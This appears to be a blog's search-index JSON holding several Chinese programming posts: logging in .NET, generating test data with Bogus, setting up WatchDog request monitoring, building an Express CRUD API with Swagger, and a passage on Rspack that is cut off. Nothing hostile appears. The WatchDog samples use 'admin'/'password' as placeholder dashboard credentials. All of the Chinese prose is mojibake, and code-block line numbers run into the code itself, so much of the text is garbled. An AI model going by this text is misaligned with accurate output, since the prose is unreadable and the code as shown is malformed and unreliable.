åŸºç¡€ç±»åº“çš„ä¸€éƒ¨åˆ†ï¼Œä½†å®ƒä¸ç‰¹å®šäºä»»ä½•ç‰¹å®šçš„åº”ç”¨ç¨‹åºæ¡†æ¶ï¼Œä¹Ÿæ²¡æœ‰é›†æˆçš„æ¦‚å¿µã€‚ å¼‚å¸¸å¤„ç†ï¼šä½¿ç”¨ ILogger è®°å½•å¼‚å¸¸æ—¶ï¼Œå¯ä»¥å°†å¼‚å¸¸å¯¹è±¡ä½œä¸ºå‚æ•°ä¼ é€’ï¼Œè¿™æ ·æ—¥å¿—è®°å½•å™¨å¯ä»¥æ•è·å¹¶è®°å½•å¼‚å¸¸çš„è¯¦ç»†ä¿¡æ¯ã€‚Console.WriteLine åªèƒ½æ‰‹åŠ¨å°†å¼‚å¸¸ä¿¡æ¯è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œç„¶åè¾“å‡ºã€‚ æ€»ç»“ï¼š ILogger æä¾›äº†æ›´ä¸°å¯Œçš„æ—¥å¿—è®°å½•åŠŸèƒ½ï¼ŒåŒ…æ‹¬æ—¥å¿—çº§åˆ«ã€å¯é…ç½®æ€§ã€ç»“æ„åŒ–æ—¥å¿—æ”¯æŒä»¥åŠä¸æ¡†æ¶çš„è‰¯å¥½é›†æˆã€‚Console.WriteLine æ›´ç®€å•æ˜“ç”¨ï¼Œé€‚ç”¨äºå¿«é€ŸåŸå‹å¼€å‘æˆ–ç®€å•çš„æ—¥å¿—è®°å½•éœ€æ±‚ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¯¹äºç”Ÿäº§ç¯å¢ƒä¸­çš„åº”ç”¨ç¨‹åºï¼Œæ¨èä½¿ç”¨ ILoggerï¼Œå› ä¸ºå®ƒæä¾›äº†æ›´å¤šçš„çµæ´»æ€§å’Œæ§åˆ¶èƒ½åŠ›ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":"Bogus-.NET Fake Data","slug":"Bogus-NET-Fake-Data","date":"2024-11-10T13:09:29.000Z","updated":"2024-11-27T14:47:03.933Z","comments":true,"path":"2024/11/10/Bogus-NET-Fake-Data/","permalink":"https://banjinmei.github.io/2024/11/10/Bogus-NET-Fake-Data/","excerpt":"","text":"Boguså¿«é€Ÿç”Ÿæˆæ¨¡æ‹Ÿæ•°æ®é€‚ç”¨äºå•å…ƒæµ‹è¯•ã€åŸå‹è®¾è®¡ã€æ¼”ç¤ºæ•°æ®å‡†å¤‡ã€‚ 1.NuGet å®‰è£… Bogus2.ç®€å•ä½¿ç”¨12345678910111213141516 var faker = new Faker();// var faker = new Faker(&quot;zh_CN&quot;); ////ä¸­æ–‡ Console.WriteLine($&quot;Name: &#123;faker.Name.FullName()&#125;&quot;); Console.WriteLine($&quot;Email: &#123;faker.Internet.Email()&#125;&quot;); Console.WriteLine($&quot;Phone: &#123;faker.Phone.PhoneNumber()&#125;&quot;); Console.WriteLine($&quot;Address: &#123;faker.Address.FullAddress()&#125;&quot;); Console.WriteLine($&quot;Company: &#123;faker.Company.CompanyName()&#125;&quot;); Console.WriteLine($&quot;Catch Phrase: &#123;faker.Company.CatchPhrase()&#125;&quot;); Console.WriteLine($&quot;BS: &#123;faker.Company.Bs()&#125;&quot;); Console.WriteLine($&quot;Product: &#123;faker.Commerce.Product()&#125;&quot;); Console.WriteLine($&quot;Price: &#123;faker.Commerce.Price()&#125;&quot;); Console.WriteLine($&quot;Credit Card: &#123;faker.Finance.CreditCardNumber()&#125;&quot;); Console.WriteLine($&quot;Bitcoin Address: &#123;faker.Finance.BitcoinAddress()&#125;&quot;); Console.WriteLine($&quot;User Agent: &#123;faker.Internet.UserAgent()&#125;&quot;); Console.WriteLine($&quot;Color: &#123;faker.Commerce.Color()&#125;&quot;); Console.WriteLine($&quot;Time Zone: &#123;faker.Date.TimeZoneString()&#125;&quot;); 3.è‡ªå®šä¹‰ç±»ä½¿ç”¨12345678910111213141516171819202122232425 public class TUser &#123; public int Id &#123; get; set; &#125; public string FirstName &#123; get; set; &#125; public string LastName &#123; get; set; &#125; public string Email &#123; get; set; &#125; public DateTime Birth &#123; get; set; &#125; &#125;//æ¨¡æ‹Ÿæ•°æ® var faker = new Faker&lt;TUser&gt;().RuleFor(u =&gt; u.Id, f =&gt; f.Random.Int(1, 9999)) .RuleFor(u =&gt; u.FirstName, f =&gt; f.Name.FirstName()) .RuleFor(u =&gt; u.LastName, f =&gt; f.Name.LastName()) .RuleFor(u =&gt; u.Email, (f, u) =&gt; f.Internet.Email(u.FirstName, u.LastName)) .RuleFor(u =&gt; u.Birth, f =&gt; f.Date.Past(50)); TUser user = faker.Generate(); Console.WriteLine($&quot;Id: &#123;user.Id&#125;&quot;); Console.WriteLine($&quot;Name: &#123;user.FirstName&#125; &#123;user.LastName&#125;&quot;); Console.WriteLine($&quot;Email: &#123;user.Email&#125;&quot;); Console.WriteLine($&quot;Date of Birth: &#123;user.Birth:d&#125;&quot;);//æ¨¡æ‹Ÿå¤šä¸ª List&lt;TUser&gt; users = faker.Generate(10);//10count foreach (var user in users) &#123; Console.WriteLine($&quot;&#123;user.FirstName&#125; &#123;user.LastName&#125; (&#123;user.Email&#125;)&quot;); &#125; 4.å¤æ‚å¯¹è±¡1234567891011121314151617181920212223242526272829303132333435363738394041 public class TOrderItem &#123; public string ProductName &#123; get; set; &#125; public int Quantity &#123; get; set; &#125; public decimal Price &#123; get; set; &#125; &#125; public class TOrder &#123; public int Id &#123; get; set; &#125; public TUser Customer &#123; get; set; &#125; public DateTime OrderDate &#123; get; set; &#125; public List&lt;TOrderItem&gt; Items &#123; get; set; &#125; public decimal TotalAmount &#123; get; set; &#125; &#125;//æ¨¡æ‹Ÿæ•°æ® var userFaker = new Faker&lt;TUser&gt;() .RuleFor(u =&gt; u.Id, f =&gt; f.Random.Int(1, 999)) .RuleFor(u =&gt; u.FirstName, f =&gt; f.Name.FirstName()) .RuleFor(u =&gt; u.LastName, f =&gt; f.Name.LastName()) .RuleFor(u =&gt; u.Email, (f, u) =&gt; f.Internet.Email(u.FirstName, u.LastName)); var orderItemFaker = new Faker&lt;TOrderItem&gt;() .RuleFor(oi =&gt; oi.ProductName, f =&gt; f.Commerce.ProductName()) .RuleFor(oi =&gt; oi.Quantity, f =&gt; f.Random.Int(1, 888)) .RuleFor(oi =&gt; oi.Price, f =&gt; decimal.Parse(f.Commerce.Price())); var orderFaker = new Faker&lt;TOrder&gt;() .RuleFor(o =&gt; o.Id, f =&gt; f.Random.Int(10000, 99999)) .RuleFor(o =&gt; o.Customer, f =&gt; userFaker.Generate()) .RuleFor(o =&gt; o.OrderDate, f =&gt; f.Date.Recent(30)) .RuleFor(o =&gt; o.Items, f =&gt; orderItemFaker.Generate(f.Random.Int(1, 5))) .RuleFor(o =&gt; o.TotalAmount, (f, o) =&gt; o.Items.Sum(i =&gt; i.Price * i.Quantity)); TOrder order = orderFaker.Generate(); Console.WriteLine($&quot;Order ID: &#123;order.Id&#125;&quot;); Console.WriteLine($&quot;Customer: &#123;order.Customer.FirstName&#125; &#123;order.Customer.LastName&#125;&quot;); // Console.WriteLine($&quot;Order Date: &#123;order.OrderDate:d&#125;&quot;); Console.WriteLine(&quot;Items:&quot;); foreach (var item in order.Items) &#123; Console.WriteLine($&quot; &#123;item.ProductName&#125; - Quantity: &#123;item.Quantity&#125;, Price: &#123;item.Price:C&#125;&quot;); &#125; Console.WriteLine($&quot;Total Amount: &#123;order.TotalAmount:C&#125;&quot;); 5.seedå€¼ç¡®ä¿æ¯æ¬¡ç”Ÿæˆçš„å€¼ç›¸åŒ 12var faker = new Faker(&quot;zh_CN&quot;); faker.Random = new Randomizer(123);//seed 123Console.WriteLine(faker.Name.FullName()); 6.å›½é™…åŒ–locales 12345var fakerEs = new Faker(&quot;es&quot;); Console.WriteLine($&quot;Spanish name: &#123;fakerEs.Name.FullName()&#125;&quot;);var fakerDe = new Faker(&quot;de&quot;); Console.WriteLine($&quot;German name: &#123;fakerDe.Name.FullName()&#125;&quot;);var fakerFr = new Faker(&quot;fr&quot;); Console.WriteLine($&quot;French name: &#123;fakerFr.Name.FullName()&#125;&quot;);var fakerRu = new Faker(&quot;zh_TW&quot;); Console.WriteLine($&quot;TW name: &#123;fakerRu.Name.FullName()&#125;&quot;);var fakerJP = new Faker(&quot;ja&quot;); Console.WriteLine($&quot;JP name: &#123;fakerJP.Name.FullName()&#125;&quot;); 7.å®šä¹‰è§„åˆ™1234.RuleSet(&quot;adult&quot;, set =&gt; &#123; set.RuleFor(u =&gt; u.Birth, f =&gt; f.Date.Past(35, DateTime.Now.AddYears(-16)));&#125;); ç”¨æˆ·çš„å‡ºç”Ÿæ—¥æœŸè¢«é™å®šä¸ºå½“å‰æ—¶é—´å¾€å‰æ¨35å¹´åˆ°16å¹´ä¹‹é—´çš„éšæœºæ—¥æœŸï¼Œè¿™æ ·ç”Ÿæˆçš„ç”¨æˆ·å°±æ˜¯35å²å†…çš„æˆå¹´äººã€‚&#x2F;&#x2F;Born: {adultUser.Birth:d}","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":".NET WatchDog","slug":"NET-WatchDog","date":"2024-11-08T16:01:03.000Z","updated":"2024-11-19T14:08:03.314Z","comments":true,"path":"2024/11/09/NET-WatchDog/","permalink":"https://banjinmei.github.io/2024/11/09/NET-WatchDog/","excerpt":"","text":"WatchDogæ˜¯ä¸€ä¸ªå¼€æºï¼ˆMIT Licenseï¼‰ã€å…è´¹çš„å®æ—¶åº”ç”¨ç›‘æ§ç³»ç»Ÿï¼Œå®ƒå¯ä»¥å®æ—¶è®°å½•å¹¶æŸ¥çœ‹åº”ç”¨ä¸­çš„æ¶ˆæ¯ã€äº‹ä»¶ã€HTTP è¯·æ±‚å’Œå“åº”ï¼Œä»¥åŠè¿è¡Œæ—¶æ•è·çš„å¼‚å¸¸ã€‚ åŠŸèƒ½ç‰¹ç‚¹å®æ—¶æ—¥å¿—è®°å½•ï¼šèƒ½å¤Ÿå®æ—¶è®°å½•HTTPè¯·æ±‚ã€å“åº”ä»¥åŠè¿è¡Œæ—¶æ•è·çš„å¼‚å¸¸ã€‚ä»£ç å†…æ—¥å¿—è®°å½•ï¼šæ”¯æŒåœ¨ä»£ç ä¸­è®°å½•æ¶ˆæ¯å’Œäº‹ä»¶ã€‚æ—¥å¿—æœç´¢åŠŸèƒ½ï¼šæ”¯æŒå¯¹HTTPè¯·æ±‚å’Œå¼‚å¸¸æ—¥å¿—è¿›è¡Œæœç´¢ã€‚HTTPæ—¥å¿—ç­›é€‰ï¼šå¯æ ¹æ®HTTPæ–¹æ³•å’ŒçŠ¶æ€ç ç­›é€‰HTTPæ—¥å¿—ã€‚æŠ¥è­¦é€šçŸ¥ï¼šæ”¯æŒé€šè¿‡é‚®ä»¶ã€çŸ­ä¿¡ç­‰å¤šç§æ–¹å¼å‘é€æŠ¥è­¦é€šçŸ¥ï¼Œç¡®ä¿èƒ½å¤ŸåŠæ—¶å¾—åˆ°åé¦ˆã€‚çµæ´»é…ç½®ï¼šå¯ä»¥æ ¹æ®åº”ç”¨éœ€æ±‚è¿›è¡Œçµæ´»çš„é…ç½®ï¼Œé€‚åº”ä¸åŒçš„ç›‘æ§éœ€æ±‚ã€‚ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼é»‘åå• ï¼šæ–°å¢äº†ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œé»‘åå•è¿‡æ»¤çš„åŠŸèƒ½ã€‚ å·¥ä½œåŸç†WatchDog åˆ©ç”¨ SignalR å®ç°äº†å®æ—¶ç›‘æ§ï¼Œå¹¶ä½¿ç”¨LiteDbä½œä¸ºæ— éœ€é…ç½®çš„ç±»ä¼¼MongoDBçš„æœåŠ¡å™¨ç«¯æ•°æ®åº“ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒä½¿ç”¨å¤–éƒ¨æ•°æ®åº“ï¼ˆå¦‚MSSQLã€MySQLã€PostgreSQLã€MongoDBï¼‰ã€‚ ä½¿ç”¨ WatchDogé¦–å…ˆï¼Œåœ¨é¡¹ç›®ä¸­å®‰è£… WatchDog åŒ…ã€‚ NuGet åŒ…ç®¡ç†å™¨ä¸­å®‰è£…ï¼š1dotnet add package WatchDog åœ¨ Startup.cs ä¸­é…ç½® WatchDogï¼šåœ¨ ConfigureServices æ–¹æ³•ä¸­æ·»åŠ  WatchDogï¼š 12345678public void ConfigureServices(IServiceCollection services)&#123; services.AddControllers(); // æ·»åŠ  WatchDog æœåŠ¡ services.AddWatchDogServices();&#125; ç„¶åï¼Œåœ¨ Configure æ–¹æ³•ä¸­é…ç½®å®ƒï¼š 12345678910111213141516171819202122232425public void Configure(IApplicationBuilder app, IWebHostEnvironment env)&#123; if (env.IsDevelopment()) &#123; app.UseDeveloperExceptionPage(); &#125; app.UseHttpsRedirection(); app.UseRouting(); app.UseAuthorization(); app.UseEndpoints(endpoints =&gt; &#123; endpoints.MapControllers(); &#125;); // é…ç½® WatchDog ä¸­é—´ä»¶ï¼ŒæŒ‡å®š API æ—¥å¿—æŸ¥çœ‹çš„è®¿é—®è·¯å¾„å’Œå®‰å…¨é€‰é¡¹ app.UseWatchDog(opt =&gt; &#123; opt.WatchPageUsername = &quot;admin&quot;; // è®¾ç½®ç”¨æˆ·å opt.WatchPagePassword = &quot;password&quot;; // è®¾ç½®å¯†ç  opt.Blacklist = new List&lt;string&gt; &#123; &quot;/health&quot; &#125;; // ä¸è®°å½•ç‰¹å®šè·¯å¾„ &#125;);&#125; æ§åˆ¶å™¨ä¸­è®°å½•æ—¥å¿—WatchDog ä¼šè‡ªåŠ¨è®°å½•æ‰€æœ‰ API è¯·æ±‚å’Œå“åº”ï¼Œå¦‚æœä½ æƒ³æ‰‹åŠ¨è®°å½•ç‰¹å®šçš„äº‹ä»¶æˆ–æ—¥å¿—ï¼Œå¯ä»¥ä½¿ç”¨ WatchLoggerã€‚ 12345678910111213141516using WatchDog;[ApiController][Route(&quot;[controller]&quot;)]public class SampleController : ControllerBase&#123; [HttpGet(&quot;test&quot;)] public IActionResult TestEndpoint() &#123; // æ‰‹åŠ¨è®°å½•æ—¥å¿— WatchLogger.Log(&quot;This is a manual log message&quot;); return Ok(&quot;Test endpoint&quot;); &#125;&#125; æŸ¥çœ‹æ—¥å¿—å¯åŠ¨åº”ç”¨åï¼Œæ‰“å¼€æµè§ˆå™¨ï¼Œè®¿é—® https:&#x2F;&#x2F;&#x2F;watchdog (ä¾‹å¦‚ï¼Œhttps://localhost:5001/watchdog) ï¼Œè¾“å…¥é…ç½®çš„ç”¨æˆ·åå’Œå¯†ç å³å¯æŸ¥çœ‹æ—¥å¿—ã€‚ æ³¨æ„äº‹é¡¹åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨æ—¶ï¼Œè¯·ç¡®ä¿è®¾ç½®åˆé€‚çš„è®¿é—®æƒé™ä»¥ä¿æŠ¤æ—¥å¿—ã€‚ä½¿ç”¨ Blacklist é…ç½®å¯ä»¥é¿å…è®°å½•ä¸éœ€è¦çš„è·¯ç”±ã€‚è¿™æ ·å°±å¯ä»¥é€šè¿‡ WatchDog è½»æ¾è®°å½•å’ŒæŸ¥çœ‹ API è¯·æ±‚å’Œå“åº”æ—¥å¿—ã€‚ æ¥å£401 401æ£€æŸ¥ä¸­é—´ä»¶é¡ºåºUseWatchDog çš„ä¸­é—´ä»¶éœ€è¦åœ¨ app.UseEndpoints æˆ– app.MapControllers ä¹‹å‰æ·»åŠ ã€‚ç¡®ä¿ä¸­é—´ä»¶çš„è°ƒç”¨é¡ºåºæ­£ç¡®ï¼Œä¾‹å¦‚ï¼š 12345678910111213141516app.UseRouting();app.UseAuthentication();app.UseAuthorization();app.UseWatchDog(opt =&gt;&#123; opt.WatchPageUsername = &quot;admin&quot;; opt.WatchPagePassword = &quot;password&quot;;&#125;);app.UseEndpoints(endpoints =&gt;&#123; endpoints.MapControllers();&#125;);","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":"Node Swagger","slug":"Node-Swagger","date":"2024-11-06T16:37:19.000Z","updated":"2024-11-06T16:39:20.329Z","comments":true,"path":"2024/11/07/Node-Swagger/","permalink":"https://banjinmei.github.io/2024/11/07/Node-Swagger/","excerpt":"","text":"Node.js å’Œ Swagger åˆ›å»ºç®€å•å¢åˆ æ”¹æŸ¥ (CRUD) API ï¼Œ ä½¿ç”¨ Express ä½œä¸º Web æ¡†æ¶ï¼Œå¹¶é›†æˆ Swagger UI æ¥è‡ªåŠ¨ç”Ÿæˆ API æ–‡æ¡£ã€‚ 1234mkdir node-swagger-crudcd node-swagger-crudnpm init -ynpm install express swagger-jsdoc swagger-ui-express 2: è®¾ç½® Express åº”ç”¨åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ app.jsï¼Œç”¨äºå®šä¹‰ Express åº”ç”¨åŠåŸºæœ¬è·¯ç”±ã€‚ 123456789101112131415161718192021222324252627282930313233// app.jsconst express = require(&quot;express&quot;);const app = express();app.use(express.json()); // è§£æ JSON è¯·æ±‚const swaggerJsDoc = require(&quot;swagger-jsdoc&quot;);const swaggerUi = require(&quot;swagger-ui-express&quot;);// Swagger é…ç½®const swaggerOptions = &#123; swaggerDefinition: &#123; openapi: &quot;3.0.0&quot;, info: &#123; title: &quot;Simple CRUD API&quot;, version: &quot;1.0.0&quot;, description: &quot;A simple CRUD API with Swagger documentation&quot;, &#125;, &#125;, apis: [&quot;./routes/*.js&quot;],&#125;;const swaggerDocs = swaggerJsDoc(swaggerOptions);app.use(&quot;/api-docs&quot;, swaggerUi.serve, swaggerUi.setup(swaggerDocs));// å¼•å…¥ CRUD è·¯ç”±const itemsRouter = require(&quot;./routes/items&quot;);app.use(&quot;/api/items&quot;, itemsRouter);const PORT = process.env.PORT || 3000;app.listen(PORT, () =&gt; &#123; console.log(`Server running on http://localhost:$&#123;PORT&#125;`); console.log(`Swagger docs available on http://localhost:$&#123;PORT&#125;/api-docs`);&#125;); 3: åˆ›å»º CRUD è·¯ç”±åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹åˆ›å»º routes æ–‡ä»¶å¤¹ï¼Œå¹¶åœ¨å…¶ä¸­åˆ›å»º items.js æ–‡ä»¶ï¼Œå®šä¹‰ CRUD æ“ä½œæ¥å£ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162// routes/items.jsconst express = require(&quot;express&quot;);const router = express.Router();let items = []; // æ¨¡æ‹Ÿæ•°æ®åº“ä¸­çš„æ•°æ®/** * @swagger * components: * schemas: * Item: * type: object * required: * - name * properties: * id: * type: integer * description: The auto-generated id of the item * name: * type: string * description: The name of the item * example: * id: 1 * name: Sample Item *//** * @swagger * /api/items: * get: * summary: è·å–æ‰€æœ‰ items * tags: [Items] * responses: * 200: * description: The list of items * content: * application/json: * schema: * type: array * items: * $ref: &#x27;#/components/schemas/Item&#x27; */router.get(&quot;/&quot;, (req, res) =&gt; &#123; res.json(items);&#125;);/** * @swagger * /api/items/&#123;id&#125;: * get: * summary: è·å–å•ä¸ª item * tags: [Items] * parameters: * - in: path * name: id * schema: * type: integer * required: true * description: Item ID * responses: * 200: * description: Item data * content: * application/json: * schema: * $ref: &#x27;#/components/schemas/Item&#x27; * 404: * description: Item not found */router.get(&quot;/:id&quot;, (req, res) =&gt; &#123; const item = items.find((i) =&gt; i.id === parseInt(req.params.id)); if (!item) return res.status(404).send(&quot;Item not found&quot;); res.json(item);&#125;);/** * @swagger * /api/items: * post: * summary: åˆ›å»ºä¸€ä¸ªæ–°çš„ item * tags: [Items] * requestBody: * required: true * content: * application/json: * schema: * $ref: &#x27;#/components/schemas/Item&#x27; * responses: * 201: * description: Item created */router.post(&quot;/&quot;, (req, res) =&gt; &#123; const item = &#123; id: items.length + 1, name: req.body.name, &#125;; items.push(item); res.status(201).json(item);&#125;);/** * @swagger * /api/items/&#123;id&#125;: * put: * summary: æ›´æ–°æŒ‡å®š ID çš„ item * tags: [Items] * parameters: * - in: path * name: id * schema: * type: integer * required: true * description: Item ID * requestBody: * required: true * content: * application/json: * schema: * $ref: &#x27;#/components/schemas/Item&#x27; * responses: * 200: * description: Item updated * 404: * description: Item not found */router.put(&quot;/:id&quot;, (req, res) =&gt; &#123; const item = items.find((i) =&gt; i.id === parseInt(req.params.id)); if (!item) return res.status(404).send(&quot;Item not found&quot;); item.name = req.body.name; res.json(item);&#125;);/** * @swagger * /api/items/&#123;id&#125;: * delete: * summary: åˆ é™¤æŒ‡å®š ID çš„ item * tags: [Items] * parameters: * - in: path * name: id * schema: * type: integer * required: true * description: Item ID * responses: * 200: * description: Item deleted * 404: * description: Item not found */router.delete(&quot;/:id&quot;, (req, res) =&gt; &#123; const itemIndex = items.findIndex((i) =&gt; i.id === parseInt(req.params.id)); if (itemIndex === -1) return res.status(404).send(&quot;Item not found&quot;); items.splice(itemIndex, 1); res.send(&quot;Item deleted&quot;);&#125;);module.exports = router; 4: å¯åŠ¨æœåŠ¡å™¨1node app.js è®¿é—® http://localhost:3000/api-docsï¼Œå¯ä»¥æŸ¥çœ‹ç”Ÿæˆçš„ Swagger æ–‡æ¡£ã€‚ æµ‹è¯• APIä»¥ä¸‹æ˜¯ API æ¥å£çš„ç¤ºä¾‹è¯·æ±‚ï¼š è·å–æ‰€æœ‰ items: GET http://localhost:3000/api/itemsè·å–å•ä¸ª item: GET http://localhost:3000/api/items/{id}åˆ›å»º item: POST http://localhost:3000/api/itemsï¼ŒJSON æ•°æ® { â€œnameâ€: â€œNew Itemâ€ }æ›´æ–° item: PUT http://localhost:3000/api/items/{id}ï¼ŒJSON æ•°æ® { â€œnameâ€: â€œUpdated Itemâ€ }åˆ é™¤ item: DELETE http://localhost:3000/api/items/{id} è¿™æ ·ï¼Œä¸€ä¸ªç®€å•çš„ CRUD æ¥å£åŠå…¶æ–‡æ¡£å°±æ„å»ºå®Œæˆäº†ï¼","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"node","slug":"node","permalink":"https://banjinmei.github.io/tags/node/"},{"name":"swagger","slug":"swagger","permalink":"https://banjinmei.github.io/tags/swagger/"}],"author":"mu"},{"title":"Rspack Vue3","slug":"Rspack-Vue3","date":"2024-11-06T16:31:15.000Z","updated":"2025-03-16T13:51:06.800Z","comments":true,"path":"2024/11/07/Rspack-Vue3/","permalink":"https://banjinmei.github.io/2024/11/07/Rspack-Vue3/","excerpt":"","text":"Rspack+Vue3+TS é¡¹ç›®ç¯å¢ƒæ„å»ºåˆ°å®æˆ˜Rspackæ˜¯ä»€ä¹ˆ?Rspackæ˜¯ä¸€ä¸ªåŸºäº Rust ç¼–å†™çš„é«˜æ€§èƒ½JavaScript æ‰“åŒ…å·¥å…·ï¼Œå®ƒæä¾›å¯¹ webpack ç”Ÿæ€è‰¯å¥½çš„å…¼å®¹æ€§èƒ½å¤Ÿæ— ç¼æ›¿æ¢ webpackï¼Œå¹¶æä¾›é—ªç”µèˆ¬çš„æ„å»ºé€Ÿåº¦ã€‚ ä¸ºä»€ä¹ˆè¦åš Rspackåˆ›å»º Rspack çš„åŸå› ï¼Œæ˜¯ä¸ºäº†è§£å†³åœ¨å­—èŠ‚è·³åŠ¨ç»´æŠ¤æ„å»ºå·¥å…·æ—¶é‡åˆ°çš„å„ç§æ€§èƒ½é—®é¢˜ã€‚åœ¨å­—èŠ‚è·³åŠ¨å†…éƒ¨å­˜åœ¨è®¸å¤šå·¨çŸ³åº”ç”¨ï¼Œå®ƒä»¬éƒ½å…·æœ‰å¤æ‚çš„æ„å»ºé…ç½®ï¼Œç”Ÿäº§ç¯å¢ƒçš„æ„å»ºéœ€è¦è€—è´¹åå‡ åˆ†é’Ÿï¼Œç”šè‡³è¶…è¿‡åŠå°æ—¶;å¼€å‘ç¯å¢ƒçš„è€—æ—¶ä¹Ÿè¶…è¿‡åå‡ åˆ†é’Ÿã€‚æˆ‘ä»¬åœ¨ webpack ä¸Šå°è¯•äº†å¤šç§æ–¹æ³•æ¥ä¼˜åŒ–è¿™äº›å·¨çŸ³åº”ç”¨ï¼Œä½†æ˜¯æ•ˆæœç”šå¾®ã€‚æˆ‘ä»¬æ„è¯†åˆ°åœ¨ webpack ä¸Šçš„ä¼˜åŒ–å·²ç»éš¾ä»¥ä¸ºç»§ï¼Œå¿…é¡»è¦ä»åº•å±‚æ”¹é€ ï¼Œæ‰èƒ½é€‚åº”æˆ‘ä»¬çš„éœ€æ±‚ã€‚åŒæ—¶åœ¨è†å¬è§£å†³ä¸šåŠ¡å„ç§å¤æ‚çš„æ„å»ºéœ€æ±‚ä¸­ï¼Œæˆ‘ä»¬æ„è¯†åˆ°å¼€å‘äººå‘˜å¯¹æ„å»ºå·¥å…·æœ‰ä»¥ä¸‹è¦æ±‚:å¿«é€Ÿçš„ Dev å¯åŠ¨æ€§èƒ½ npm run dev æ˜¯å¼€å‘è€…æ¯å¤©éœ€è¦è¿è¡Œå¾ˆå¤šæ¬¡çš„å‘½ä»¤ï¼Œä½†å¤§å‹é¡¹ç›®æ¯æ¬¡éƒ½éœ€å’Œè¦ç­‰å¾… 10åˆ†é’Ÿï¼Œè¿™å¯¹äºå·¥ç¨‹å¸ˆæ¥è¯´éå¸¸ç—›è‹¦ï¼Œå› æ­¤ä¼˜åŒ–å¼€å‘æ¨¡å¼ä¸‹å¯åŠ¨çš„æ—¶é—´è‡³å…³é‡è¦é«˜æ•ˆçš„ Build æ€§èƒ½ npm run bui1d ç»å¸¸åœ¨ CI&#x2F;CD ç¯å¢ƒä¸­è¿è¡Œï¼Œå®ƒå†³å®šäº†åº”ç”¨ç”Ÿäº§äº¤ä»˜çš„æ•ˆç‡,æœ‰äº›åº”ç”¨åœ¨ç”Ÿäº§ç¯å¢ƒä¸­éœ€è¦ 20 åˆ° 30 åˆ†é’Ÿçš„æ„å»ºæ—¶é—´ï¼Œå¦‚æœèƒ½ç¼©çŸ­è¿™æ®µæ—¶é—´ï¼Œå¯¹å¼€å‘æµç¨‹ä¹Ÿå°†éå¸¸æœ‰å¸®åŠ©ã€‚çµæ´»çš„é…ç½® ç”¨æˆ·å·¥ç¨‹çš„é…ç½®éå¸¸çµæ´»ï¼Œä¸å¤Ÿç»Ÿä¸€ã€‚åœ¨ä¹‹å‰çš„å°è¯•ä¸­ï¼Œå°†webpacké…ç½®è¿ç§»åˆ°å…¶ä»–æ„å»ºå·¥å…·æ—¶ï¼Œæˆ‘ä»¬é‡åˆ°äº†è®¸å¤šé—®é¢˜ï¼Œå› ä¸ºå…¶ä»–æ„å»ºå·¥å…·çš„é…ç½®ä¸å¦‚ webpack çµæ´»ã€‚ç”Ÿäº§ç¯å¢ƒçš„ä¼˜åŒ–èƒ½åŠ› åœ¨å¯ç”¨ Rspackä¹‹å‰ï¼Œæˆ‘ä»¬å°è¯•äº†ç¤¾åŒºå†…çš„å„ç§æ–¹æ¡ˆï¼Œä½†å®ƒä»¬éƒ½é¢ä¸´ç€ä¸€å®šç¨‹åº¦çš„ç”Ÿäº§ç¯å¢ƒè´Ÿä¼˜åŒ–ï¼Œä¾‹å¦‚æ‹†åˆ†åŒ…ä¸å¤Ÿç²¾ç»†ç­‰ã€‚å› æ­¤ï¼Œä¼˜åŒ–ç”Ÿäº§ç¯å¢ƒçš„äº§ç‰©æ˜¯æˆ‘ä»¬ä¸å¯æ”¾å¼ƒçš„åŠŸèƒ½ã€‚åœ¨ç¡®å®šäº†è¿™å››ä¸ªéœ€æ±‚åï¼Œæˆ‘ä»¬è°ƒæŸ¥äº†ç¤¾åŒºä¸­çš„æ‰€æœ‰æŠ€æœ¯æ–¹æ¡ˆï¼Œå®ƒä»¬é€šå¸¸éƒ½èƒ½å¾ˆå¥½çš„æ»¡è¶³å…¶ä¸­ä¸ªåˆ«éœ€æ±‚ä½†æ²¡æœ‰ä¸€ä¸ªæ–¹æ¡ˆèƒ½åŒæ—¶æ»¡è¶³æ‰€æœ‰æ¡ä»¶ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å†³å®šè‡ªç ” Rspackã€‚ å’Œ webpack çš„åŒºåˆ«webpackæ˜¯ç›®å‰æœ€ä¸ºæˆç†Ÿçš„æ„å»ºå·¥å…·ï¼Œæœ‰ç€æ´»è·ƒçš„ç”Ÿæ€ï¼Œçµæ´»çš„é…ç½®å’Œä¸°å¯Œçš„åŠŸèƒ½ï¼Œä½†æ˜¯å…¶æœ€ä¸ºäººè¯Ÿç—…çš„æ˜¯å…¶æ€§èƒ½é—®é¢˜ï¼Œå°¤å…¶åœ¨ä¸€äº›å¤§å‹é¡¹ç›®ä¸Šï¼Œæ„å»ºèŠ±è´¹çš„æ—¶é—´å¯èƒ½ä¼šè¾¾åˆ°å‡ åˆ†é’Ÿç”šè‡³å‡ 